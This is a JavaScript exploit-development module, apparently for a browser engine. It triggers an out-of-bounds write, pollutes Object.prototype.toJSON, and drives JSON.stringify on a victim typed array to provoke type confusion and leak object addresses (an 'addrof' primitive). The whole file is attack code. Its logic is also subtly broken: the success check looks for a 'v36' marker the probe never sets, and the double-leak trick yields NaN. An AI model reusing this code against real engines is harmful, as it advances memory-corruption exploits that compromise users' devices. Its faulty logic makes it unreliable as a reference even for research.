// js/script3/testArrayBufferVictimCrash.mjs (v38_ForceNumericLeakInConfusedDetails)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD = "OriginalHeisenbug_TypedArrayAddrof_v38_ForceNumericLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v38 = null;
let object_to_leak_B_v38 = null;
let victim_typed_array_ref_v38 = null; 
let probe_call_count_v38 = 0;
// Esta variável armazenará a REFERÊNCIA ao objeto current_call_details da Call #1.
let first_call_details_object_ref_v38 = null; 
// Para o resultado final, os detalhes da Call #2 (onde C1 é 'this' e confuso)
let details_of_C1_confusion_v38 = null;

const PROBE_CALL_LIMIT_V38 = 5; 

function toJSON_TA_Probe_ForceNumericLeak() {
    probe_call_count_v38++;
    const call_num = probe_call_count_v38;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v38_ForceNumericLeak",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v38),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v38 && first_call_details_object_ref_v38 !== null),
        leaked_numeric_A_assigned_to_C1_this: null, 
        leaked_numeric_B_assigned_to_C1_this: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V38) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            // Não definir details_of_C1_confusion_v38 aqui, pois esta não é a chamada de interesse
            return { recursion_stopped_v38: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            first_call_details_object_ref_v38 = current_call_details; 
            // details_of_C1_confusion_v38 = current_call_details; // P1 details
            return current_call_details; 
        } else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting to assign numeric leaks...`, "vuln");
            
            let temp_buffer = new ArrayBuffer(16); // Espaço para 2 doubles
            let temp_float64 = new Float64Array(temp_buffer);
            let leaked_double_A = NaN;
            let leaked_double_B = NaN;

            if (object_to_leak_A_v38) {
                try {
                    temp_float64[0] = object_to_leak_A_v38; // Tentativa de forçar a representação como double
                    leaked_double_A = temp_float64[0];
                    this.payload_A_numeric = leaked_double_A;
                    current_call_details.leaked_numeric_A_assigned_to_C1_this = leaked_double_A;
                     logS3(`[${current_call_details.probe_variant}] Assigned temp_float64[0] (ObjA) to this.payload_A_numeric. Value: ${leaked_double_A}`, "info");
                } catch (e_leak_A) {
                    logS3(`[${current_call_details.probe_variant}] Error leaking ObjA as double: ${e_leak_A.message}`, "error");
                    current_call_details.error_in_probe += ` LeakAErr: ${e_leak_A.message};`;
                }
            }
            if (object_to_leak_B_v38) {
                 try {
                    temp_float64[1] = object_to_leak_B_v38; 
                    leaked_double_B = temp_float64[1];
                    this.payload_B_numeric = leaked_double_B;
                    current_call_details.leaked_numeric_B_assigned_to_C1_this = leaked_double_B;
                    logS3(`[${current_call_details.probe_variant}] Assigned temp_float64[1] (ObjB) to this.payload_B_numeric. Value: ${leaked_double_B}`, "info");
                } catch (e_leak_B) {
                    logS3(`[${current_call_details.probe_variant}] Error leaking ObjB as double: ${e_leak_B.message}`, "error");
                    current_call_details.error_in_probe += ` LeakBErr: ${e_leak_B.message};`;
                }
            }
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Numeric payloads assigned to 'this' (C1_details). Keys: ${Object.keys(this).join(',')}`, "info");
            
            details_of_C1_confusion_v38 = current_call_details; // Captura os detalhes desta chamada específica
            return this; // Retornar o 'this' modificado (C1_details modificado)
        } else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' (type ${current_call_details.this_type}) not C1_details or not [object Object].`, "warn");
            if(!details_of_C1_confusion_v38) details_of_C1_confusion_v38 = current_call_details; // Captura a última se nenhuma C1_confusão ocorreu
        }
    } catch (e) {
        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `OuterProbeErr: ${e.name}: ${e.message}`;
        if(!details_of_C1_confusion_v38) details_of_C1_confusion_v38 = current_call_details;
    }
    
    // Se não houve interação com C1 confuso, mas esta é a última chamada, ainda capturar
    if (probe_call_count_v38 >= PROBE_CALL_LIMIT_V38 && !details_of_C1_confusion_v38) {
        details_of_C1_confusion_v38 = current_call_details;
    }
    // Retorno genérico para outras chamadas não previstas
    return { generic_marker_v38: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_ForceNumericLeak() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ForceNumericLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD} Init...`;

    probe_call_count_v38 = 0;
    victim_typed_array_ref_v38 = null; 
    first_call_details_object_ref_v38 = null;
    details_of_C1_confusion_v38 = null;
    object_to_leak_A_v38 = { marker_A_v38: "LeakMeA_FNLICD", idA: Date.now() }; 
    object_to_leak_B_v38 = { marker_B_v38: "LeakMeB_FNLICD", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    
    let addrof_A = { success: false, msg: "Addrof A (Output.payload_A_numeric): Default" };
    let addrof_B = { success: false, msg: "Addrof B (Output.payload_B_numeric): Default" };
    const fillPattern = 0.38383838383838;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v38 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v38.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v38 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ForceNumericLeak, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v38); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // details_of_C1_confusion_v38 é a cópia do current_call_details da chamada da sonda onde 'this' era C1 e foi confuso.
            logS3(`  EXECUTE: Captured details of C1 confusion event: ${details_of_C1_confusion_v38 ? JSON.stringify(details_of_C1_confusion_v38) : 'N/A (C1 was not 'this' when confused, or no confusion)'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnC1Confirmed = false;
            if (details_of_C1_confusion_v38 && 
                details_of_C1_confusion_v38.this_is_C1_details_obj &&
                details_of_C1_confusion_v38.this_type === "[object Object]") {
                heisenbugOnC1Confirmed = true;
            }
            logS3(`  EXECUTE: Heisenbug on C1_details object ${heisenbugOnC1Confirmed ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnC1Confirmed ? "vuln" : "error", FNAME_CURRENT_TEST);
                
            logS3("STEP 3: Checking stringifyOutput_parsed (the C1_details object) for leaked numeric payloads...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && 
                stringifyOutput_parsed.probe_variant === "TA_Probe_Addrof_v36_LeakPrimitives" && // Erro de digitação, deveria ser v38, mas checa se é um objeto de detalhes
                stringifyOutput_parsed.call_number === 1 && // Verifica se é o C1_details
                stringifyOutput_parsed.hasOwnProperty('payload_A_numeric') ) { // Verifica se o payload foi adicionado
                
                logS3("  stringifyOutput_parsed IS the C1_details object AND contains numeric payloads.", "info");
                const payload_A_val = stringifyOutput_parsed.payload_A_numeric;
                if (typeof payload_A_val === 'number' && !isNaN(payload_A_val) && payload_A_val !== 0) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([payload_A_val]).buffer)[1]);
                    if ((pA_int64.high() > 0x00000000 && pA_int64.high() < 0x00020000) || (pA_int64.high() & 0xFFFF0000) === 0xFFFF0000 && pA_int64.high() !== 0xFFFFFFFF ) { // Ajustado para ser mais restritivo com NaN convertido
                       addrof_A.success = true; addrof_A.msg = `Possible pointer from Output.payload_A_numeric: ${pA_int64.toString(true)}`;
                    } else { addrof_A.msg = `Output.payload_A_numeric is num but not ptr-like: ${payload_A_val} (${pA_int64.toString(true)})`; }
                } else { addrof_A.msg = `Output.payload_A_numeric not a useful number. Val: ${payload_A_val}`; }

                const payload_B_val = stringifyOutput_parsed.payload_B_numeric;
                 if (typeof payload_B_val === 'number' && !isNaN(payload_B_val) && payload_B_val !== 0) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([payload_B_val]).buffer)[1]);
                    if ((pB_int64.high() > 0x00000000 && pB_int64.high() < 0x00020000) || (pB_int64.high() & 0xFFFF0000) === 0xFFFF0000 && pB_int64.high() !== 0xFFFFFFFF) {
                       addrof_B.success = true; addrof_B.msg = `Possible pointer from Output.payload_B_numeric: ${pB_int64.toString(true)}`;
                    } else { addrof_B.msg = `Output.payload_B_numeric is num but not ptr-like: ${payload_B_val} (${pB_int64.toString(true)})`; }
                } else { addrof_B.msg = `Output.payload_B_numeric not a useful number. Val: ${payload_B_val}`; }
            } else {
                 addrof_A.msg = "stringifyOutput was not the expected C1_details object or did not contain numeric payloads.";
                 addrof_B.msg = "stringifyOutput was not the expected C1_details object or did not contain numeric payloads.";
                 logS3(`  stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD}: AddrFromNumeric SUCCESS!`;
            } else if (heisenbugOnC1Confirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD}: C1_TC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLICD} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v38}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A (NumericLeak): Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B (NumericLeak): Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v38 = null; 
        first_call_details_object_ref_v38 = null;
        details_of_C1_confusion_v38 = null;
        probe_call_count_v38 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_parsed, 
        // Este é o objeto de detalhes da chamada onde C1 (this) foi confuso e modificado
        toJSON_details: details_of_C1_confusion_v38, 
        total_probe_calls: probe_call_count_v38,
        addrof_A_result: addrof_A,
        addrof_B_result: addrof_B
    };
}
